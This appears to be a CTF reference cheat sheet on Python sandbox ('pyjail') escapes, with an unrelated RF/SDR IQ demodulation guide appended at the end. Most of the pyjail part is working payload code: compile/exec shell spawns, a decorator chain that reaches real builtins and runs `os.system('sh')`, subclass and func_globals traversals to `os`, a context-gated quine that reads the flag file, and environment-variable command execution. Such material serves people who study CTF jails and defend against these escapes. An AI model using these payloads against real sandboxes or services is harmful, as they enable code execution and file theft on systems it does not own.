- [Python Name Mangling and Attribute Access (Tokyo Westerns 2017)](#python-name-mangling-and-attribute-access-tokyo-westerns-2017)
- [Decorator-Based Escape (No Call, No Quotes, No Equals)](#decorator-based-escape-no-call-no-quotes-no-equals)
  - [Technique 1: `function.__name__` as String Keys](#technique-1-function__name__-as-string-keys)
  - [Technique 2: Name Extractor via getset_descriptor](#technique-2-name-extractor-via-getset_descriptor)
  - [Technique 3: Accessing Real Builtins via \_\_loader\_\_](#technique-3-accessing-real-builtins-via-__loader__)
  - [Full Exploit Chain](#full-exploit-chain)
  - [How the Decorator Chain Works (Bottom-Up)](#how-the-decorator-chain-works-bottom-up)
  - [Variations](#variations)
  - [Constraints Checklist for This Technique](#constraints-checklist-for-this-technique)
  - [When \_\_loader\_\_ Is Not Available](#when-__loader__-is-not-available)
- [Quine + Context Detection for Code Execution (BearCatCTF 2026)](#quine--context-detection-for-code-execution-bearcatctf-2026)
- [Restricted Character Repunit Decomposition (BearCatCTF 2026)](#restricted-character-repunit-decomposition-bearcatctf-2026)
- [Hints Cheat Sheet](#hints-cheat-sheet)

---

## Identifying Jail Type

**Error patterns reveal filtering:**

| Error Pattern | Meaning | Approach |
|---------------|---------|----------|
| `name not allowed: X` | Identifier blacklist | Unicode, hex escapes |
| `unknown function: X` | Function whitelist | Brute-force names |
| `node not allowed: X` | AST filtering | Avoid blocked syntax |
| `binop types must be int/bool` | Type restrictions | Use int operations |

---

## Systematic Enumeration

### Test Basic Features
```python
tests = [
    ("1+1", "arithmetic"),
    ("True", "booleans"),
    ("'hello'", "string literals"),
    ("'\\x41'", "hex escapes"),
    ("1==1", "comparison"),
]
```

### Test Blocked AST Nodes
```python
blocked_tests = [
    ("'a'+'b'", "string concat"),
    ("'ab'[0]", "indexing"),
    ("''.join", "attribute access"),
    ("[1,2]", "lists"),
    ("lambda:1", "lambdas"),
]
```

### Brute-Force Function Names
```python
import string
for c in string.printable:
    result = test(f"{c}(65)")
    if "unknown function" not in result:
        print(f"FOUND: {c}()")
```

---

## Oracle-Based Challenges

**Common functions:** `L()`, `Q(i, x)`, `S(guess)`
- `L()` = length of secret
- `Q(i, x)` = compare position i with value x
- `S(guess)` = submit answer

### Binary Search
```python
def find_char(i):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        cmp = query(i, mid)
        if cmp == 0:
            return chr(mid)
        elif cmp == -1:  # mid < flag[i]
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

flag_len = int(test("L()"))
flag = ''.join(find_char(i) for i in range(flag_len))
```

### Linear Search
```python
for i in range(flag_len):
    for c in range(32, 127):
        if query(i, c) == 0:
            flag += chr(c)
            break
```

---

## Building Strings Without Concat

```python
# Hex escapes
"'\\x66\\x6c\\x61\\x67'"  # => 'flag'

def to_hex_str(s):
    return "'" + ''.join(f'\\x{ord(c):02x}' for c in s) + "'"
```

---

## Classic Escape Techniques

### Via Class Hierarchy
```python
''.__class__.__mro__[1].__subclasses__()
# Find <class 'os._wrap_close'>
```

### Compile Bypass
```python
exec(compile('__import__("os").system("sh")', '', 'exec'))
```

### Unicode Bypass
```python
ｅｖａｌ = eval  # Fullwidth characters
```

### Getattr Alternatives
```python
"{0.__class__}".format('')
vars(''.__class__)
```

---

## Walrus Operator Reassignment

```python
# Reassign constraint variable
(abcdef := "all_allowed_letters")
```

### Octal Escapes
```python
# \141 = 'a', \142 = 'b', etc.
all_letters = '\141\142\143...'
(abcdef := "{all_letters}")
print(open("/flag.txt").read())
```

---

## Magic Comment Escape

```python
# -*- coding: raw_unicode_escape -*-
\u0069\u006d\u0070\u006f\u0072\u0074 os
```

**Useful encodings:**
- `utf-7`
- `raw_unicode_escape`
- `rot_13`

---

## Mastermind-Style Jails

**Output interpretation:**
```text
function("aaa...") => "1 0"  # 1 exists wrong pos, 0 correct
```

### Find Input Length
```python
for length in range(1, 50):
    result = test('a' * length)
    print(f"len={length}: {result}")
```

### Find Characters
```python
for c in charset:
    result = test(c * SECRET_LEN)
    if result[0] + result[1] > 0:
        print(f"{c}: count={result[0] + result[1]}")
```

### Find Positions
```python
known = ""
for pos in range(SECRET_LEN):
    for c in candidate_chars:
        test_str = known + c + 'Z' * (SECRET_LEN - len(known) - 1)
        result = test(test_str)
        if result[1] > len(known):
            known += c
            break
```

---

## Server Communication

```python
from pwn import *
context.log_level = 'error'

def test_with_delay(cmd, delay=5):
    r = remote('host', port, timeout=20)
    r.sendline(cmd.encode())
    import time
    time.sleep(delay)
    try:
        return r.recv(timeout=3).decode()
    except:
        return None
    finally:
        r.close()
```

---

## Magic File ReDoS

**Evil magic file:**
```text
0 regex (a+)+$ Vulnerable pattern
```

**Timing oracle:**
```python
def measure(payload):
    start = time.time()
    requests.post(URL, data={'magic': payload})
    return time.time() - start
```

---

## Environment Variable RCE

```bash
PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER="/bin/sh -c 'cat /flag' %s"
```

**Other dangerous vars:**
- `PYTHONSTARTUP` - executed on interactive
- `PYTHONPATH` - inject modules
- `PYTHONINSPECT` - drop to shell

---

## Decorator-Based Escape (No Call, No Quotes, No Equals)

**Pattern (Ergastulum):** `ast.Call` banned, no quotes, no `=`, no commas, charset `a-z0-9()[]:._@\n`. Exec context has `__builtins__={}` and `__loader__=_frozen_importlib.BuiltinImporter`.

**Key insight:** Decorators bypass `ast.Call` — `@expr` on `def name(): body` compiles to `name = expr(func)`, calling `expr` without an `ast.Call` node. This also provides assignment without `=`.

### Technique 1: `function.__name__` as String Keys

Define a function to create a string matching a dict key:
```python
def __builtins__():   # __builtins__.__name__ == "__builtins__"
    0
def exec():           # exec.__name__ == "exec"
    0
```
Use as dict subscript: `some_dict[exec.__name__]` accesses `some_dict["exec"]`.

### Technique 2: Name Extractor via getset_descriptor

`function_type.__dict__['__name__'].__get__` takes a function and returns its `.__name__` string. This enables chained decorators:

```python
@dict_obj.__getitem__        # Step 2: dict["key_name"] → value
@func.__class__.__dict__[__name__.__name__].__get__  # Step 1: extract .__name__
def key_name():              # function with __name__ == "key_name"
    0
# Result: key_name = dict_obj["key_name"]
```

### Technique 3: Accessing Real Builtins via __loader__

```python
__loader__.load_module.__func__.__globals__["__builtins__"]
```
Contains real `exec`, `__import__`, `print`, `compile`, `chr`, `type`, `getattr`, `setattr`, etc.

### Full Exploit Chain

```python
# Step 1: Define helper functions for string key extraction
def __builtins__():
    0
def __name__():
    0
def __import__():
    0

# Step 2: Extract real __import__ from loader's globals
# Equivalent to: __import__ = globals_dict["__builtins__"]["__import__"]
@__loader__.load_module.__func__.__globals__[__builtins__.__name__].__getitem__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def __import__():
    0

# Step 3: Import os module
# Equivalent to: os = __import__("os")
@__import__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def os():
    0

# Step 4: Get a shell
# Equivalent to: sh = os.system("sh")
@os.system
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def sh():
    0
```

### How the Decorator Chain Works (Bottom-Up)

```python
@outer_func
@inner_func
def name():
    0
```
Executes as: `name = outer_func(inner_func(function_named_name))`

For the `__import__` extraction:
1. `__builtins__.__class__` → `<class 'function'>` (type of our defined function)
2. `.__dict__[__name__.__name__]` → `function.__dict__["__name__"]` → getset_descriptor
3. `.__get__` → descriptor's getter (takes function, returns its `.__name__` string)
4. Applied to `def __import__(): 0` → returns string `"__import__"`
5. `globals_dict["__builtins__"].__getitem__("__import__")` → real `__import__` function

### Variations

**Execute arbitrary code via exec + code object:**
```python
def __code__():
    0
@exec_function
@__builtins__.__class__.__dict__[__code__.__name__].__get__
def payload():
    ... # code to execute (still subject to charset/AST restrictions)
```

**Import any module by name:**
```python
@__import__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def subprocess():  # or any valid module name using allowed chars
    0
```

### Constraints Checklist for This Technique

- [x] No `ast.Call` nodes (decorators are `ast.FunctionDef` with decorator_list)
- [x] No quotes (strings from `function.__name__`)
- [x] No `=` sign (decorators provide assignment)
- [x] No commas (single-argument decorator calls)
- [x] No `+`, `*`, operators (pure attribute/subscript chains)
- [x] Works with empty `__builtins__` (accesses real builtins via `__loader__`)

### When __loader__ Is Not Available

If `__loader__` isn't in scope but you have any function object `f`:
- `f.__class__` → function type
- `f.__globals__` → module globals where `f` was defined
- `f.__globals__["__builtins__"]` → real builtins (if `f` is from a normal module)

If you have a class `C`:
- `C.__init__.__globals__` → globals of the module defining `C`

**References:** 0xL4ugh CTF 2025 "Ergastulum" (442pts, Elite), GCTF 2022 "Treebox"

---

## Quine + Context Detection for Code Execution (BearCatCTF 2026)

**Pattern (The Boy is Quine):** Server asks for a quine (program that prints its own source code), validates it by running in a subprocess, then `exec()`s it in the main process with different globals.

**Exploit:** Build a dual-purpose quine that:
1. Prints itself (passes quine validation in subprocess)
2. Executes payload only in the server process (detected via globals difference)

```python
# Context gate: "subprocess" module exists in server globals but not in subprocess
s='s=%r;print(s%%s,end="");__import__("os").system("cat /app/flag.txt")if"subprocess"in globals()else 0';print(s%s,end="");__import__("os").system("cat /app/flag.txt")if"subprocess"in globals()else 0
```

**Key insight:** `exec()` in the server process inherits the server's globals (imported modules like `subprocess`), while the subprocess validation has a clean environment. Use `"module_name" in globals()` or `"module_name" in dir()` as a gate to distinguish contexts. The quine structure `s='s=%r;...';print(s%s,end="")` is the classic Python quine pattern.

---

## Restricted Character Repunit Decomposition (BearCatCTF 2026)

**Pattern (The Brig):** Pick exactly 2 characters for your entire expression. Server evaluates `eval(long_to_bytes(eval(expr)))` — the outer eval runs the decoded Python code.

**Strategy:** Choose `1` and `+`. Decompose the target integer into a sum of repunits (111, 1111, 11111, etc.):
```python
from Crypto.Util.number import bytes_to_long

target = bytes_to_long(b'eval(input())')  # → 13-byte integer

def repunit(k):
    return (10**k - 1) // 9  # 111...1 with k digits

terms = []
remaining = target
while remaining > 0:
    k = 1
    while repunit(k + 1) <= remaining:
        k += 1
    terms.append('1' * k)
    remaining -= repunit(k)

expr = '+'.join(terms)  # e.g., "111...1+111...1+11+1+1"
# len(expr) ≈ 2561 chars (fits 4096 limit)
```

**Key insight:** Any positive integer can be written as a sum of repunits (numbers like 1, 11, 111, ...). The greedy algorithm produces ~O(log²(n)) terms. This converts a 2-character constraint into arbitrary code execution via `long_to_bytes()`. On the second unrestricted prompt, run `open('/flag.txt').read()`.

**Detection:** Challenge restricts input character set to exactly 2 characters. Double-eval pattern (`eval(decode(eval(...)))`).

---

## Hints Cheat Sheet

| Hint | Meaning |
|------|---------|
| "I love chars" | Single-char functions |
| "No words" | Multi-char blocked |
| "Oracle" | Query functions to leak |
| "knight/chess" | Mastermind game |

---

## func_globals to Module Chain Traversal (PlaidCTF 2013)

**Pattern:** Access `os.system` through the `func_globals` dictionary of a loaded class's method, without importing any modules.

```python
# Step 1: Find catch_warnings in subclass list (commonly index 49 or 59)
[x for x in ().__class__.__base__.__subclasses__()
    if x.__name__ == "catch_warnings"][0]

# Step 2: Access func_globals via __init__ or __repr__
g = ().__class__.__base__.__subclasses__()[59].__init__.func_globals
# Python 2: .__init__.im_func.func_globals
# Python 3: .__init__.__globals__

# Step 3: Traverse module chain: warnings → linecache → os
g["linecache"].__dict__["os"].system("cat /flag.txt")

# One-liner:
().__class__.__base__.__subclasses__()[59].__init__.__globals__["linecache"].__dict__["os"].system("id")
```

**Key insight:** The `warnings.catch_warnings` class is almost always loaded. Its `__init__.__globals__` contains a reference to `linecache`, which imports `os`. This chain avoids direct `import` statements. The subclass index varies by Python version — enumerate with `[(i,x.__name__) for i,x in enumerate(''.__class__.__mro__[1].__subclasses__())]`.

---

## Restricted Charset Number Generation (PlaidCTF 2013)

**Pattern:** Generate arbitrary integers using only `~` (bitwise NOT), `<<` (left shift), `[]<[]` (False=0), and `{}<[]` (True=1) when numeric literals are forbidden.

```python
def brainfuckize(nb):
    """Convert integer to expression using only ~, <<, <, [], {}"""
    if nb == -2: return "~({}<[])"    # ~True = -2
    if nb == -1: return "~([]<[])"    # ~False = -1
    if nb == 0:  return "([]<[])"     # False = 0
    if nb == 1:  return "({}<[])"     # True = 1
    if nb % 2:   return f"~{brainfuckize(~nb)}"  # Odd: ~(complement)
    return f"({brainfuckize(nb//2)}<<({{}}<[]))"   # Even: half << 1

# brainfuckize(65) → "(~(~([]<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))"
# Then use: "%c" % 65 → "A"
```

**Key insight:** Combine with `"%c" % ascii_value` to build arbitrary strings character by character. This bypasses jails that strip all alphanumeric characters while allowing operators and brackets.

---

## Python Name Mangling and Attribute Access (Tokyo Westerns 2017)

Three sandbox escape vectors that exploit Python's name visibility model.

**1. Name mangling bypass:** Python "private" `__method` names in a class are stored as `_ClassName__method`. They are accessible via `dir()` and `getattr()` — not truly private.

```python
# Name mangling bypass
getattr(obj, dir(obj)[0])()  # calls _ClassName__method
```

**2. Function constant leakage:** All string literals inside a function body are stored in `func_code.co_consts` (Python 2) or `__code__.co_consts` (Python 3) and are readable from outside.

```python
# func_code local variable leak (Python 2)
func.func_code.co_consts  # reveals all string literals in function

# Python 3 equivalent
func.__code__.co_consts
```

**3. Module docstring as data store:** Module-level triple-quoted strings become `module.__doc__`, readable without needing file access.

```python
# Module docstring access
import target_module
target_module.__doc__  # reads module-level triple-quoted string
```

**Key insight:** Python `__` prefix is name-mangled, not truly private — `dir(obj)` + `getattr()` bypass it. `func_code.co_consts` exposes all literal constants defined inside a function. Module docstrings are always readable as `__doc__` without file access.

---

## Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)

**Pattern:** Store intermediate code fragments across multiple jail submissions by writing to class attributes of subclasses.

```python
# Stage 1: Store code fragment on a subclass
().__class__.__base__.__subclasses__()[-2].payload = "import os; os.system('cat /flag.txt')"

# Stage 2 (next submission): Retrieve and execute
exec(().__class__.__base__.__subclasses__()[-2].payload)
```

**Key insight:** Class attributes persist across separate `eval()`/`exec()` calls within the same process. If the jail limits input length but allows multiple submissions, split the payload across submissions using subclass attributes as storage. Use `IncrementalDecoder` or any persistent subclass as the storage target.


# rf-sdr

# CTF Misc - RF / SDR / IQ Signal Processing

Techniques for Software-Defined Radio (SDR) signal processing using In-phase/Quadrature (IQ) data.

## IQ File Formats
- **cf32** (complex float 32): GNU Radio standard, `np.fromfile(path, dtype=np.complex64)`
- **cs16** (complex signed 16-bit): `np.fromfile(path, dtype=np.int16).reshape(-1,2)`, then `I + jQ`
- **cu8** (complex unsigned 8-bit): RTL-SDR raw format

## Analysis Pipeline
```python
import numpy as np
from scipy import signal

# 1. Load IQ data
iq = np.fromfile('signal.cf32', dtype=np.complex64)

# 2. Spectrum analysis - find occupied bands
fft_data = np.fft.fftshift(np.fft.fft(iq[:4096]))
freqs = np.fft.fftshift(np.fft.fftfreq(4096))
power_db = 20*np.log10(np.abs(fft_data)+1e-10)

# 3. Identify symbol rate via cyclostationary analysis
x2 = np.abs(iq_filtered)**2  # squared magnitude
fft_x2 = np.abs(np.fft.fft(x2, n=65536))
# Peak in fft_x2 = symbol rate (samples_per_symbol = 1/peak_freq)

# 4. Frequency shift to baseband
center_freq = 0.14  # normalized frequency of band center
t = np.arange(len(iq))
baseband = iq * np.exp(-2j * np.pi * center_freq * t)

# 5. Low-pass filter to isolate band
lpf = signal.firwin(101, bandwidth/2, fs=1.0)
filtered = signal.lfilter(lpf, 1.0, baseband)
```

## QAM-16 Demodulation with Carrier + Timing Recovery
QAM-16 (Quadrature Amplitude Modulation) — the key challenge is carrier frequency offset causing constellation rotation (circles instead of points).

**Decision-directed carrier recovery + Mueller-Muller timing:**
```python
# Loop parameters (2nd order PLL)
carrier_bw = 0.02  # wider BW = faster tracking, more noise
damping = 1.0
theta_n = carrier_bw / (damping + 1/(4*damping))
Kp = 2 * damping * theta_n      # proportional gain
Ki = theta_n ** 2                # integral gain

carrier_phase = 0.0
carrier_freq = 0.0

for each symbol sample:
    # De-rotate by current phase estimate
    symbol = raw_sample * np.exp(-1j * carrier_phase)

    # Find nearest constellation point (decision)
    nearest = min(constellation, key=lambda p: abs(symbol - p))

    # Phase error (decision-directed)
    error = np.imag(symbol * np.conj(nearest)) / (abs(nearest)**2 + 0.1)

    # Update 2nd order loop
    carrier_freq += Ki * error
    carrier_phase += Kp * error + carrier_freq
```

**Mueller-Muller timing error detector:**
```python
timing_error = (Re(y[n]-y[n-1]) * Re(d[n-1]) - Re(d[n]-d[n-1]) * Re(y[n-1]))
             + (Im(y[n]-y[n-1]) * Im(d[n-1]) - Im(d[n]-d[n-1]) * Im(y[n-1]))
# y = received symbol, d = decision (nearest constellation point)
```

## Key Insights for RF CTF Challenges
- **Circles in constellation** = constant frequency offset (points rotate at fixed rate, forming a ring)
- **Spirals** = frequency offset that drifts over time (ring radius changes as amplitude/AGC also drifts). If you see points tracing outward arcs rather than closed circles, suspect combined frequency + gain instability
- **Blobs on grid** = correct sync, just noise
- **4-fold ambiguity**: DD carrier recovery can lock with 0/90/180/270 rotation - try all 4
- **Bandwidth vs symbol rate**: BW = Rs x (1 + alpha), where alpha is roll-off factor (0 to 1)
- **RC vs RRC**: "RC pulse shaping" at TX means receiver just samples (no matched filter needed); "RRC" means apply matched RRC filter at RX
- **Cyclostationary peak at Rs** confirms symbol rate even without knowing modulation order
- **AGC**: normalize signal power to match constellation power: `scale = sqrt(target_power / measured_power)`
- **GNU Radio's QAM-16 default mapping** is NOT Gray code - always check the provided constellation map

## Common Framing Patterns
- Idle/sync pattern repeating while link is idle
- Start delimiter (often a single symbol like 0)
- Data payload (nibble pairs for QAM-16: high nibble first, low nibble)
- End delimiter (same as start, e.g., 0)
- The idle pattern itself may contain the delimiter value - distinguish by context (is it part of the 16-symbol repeating pattern?)

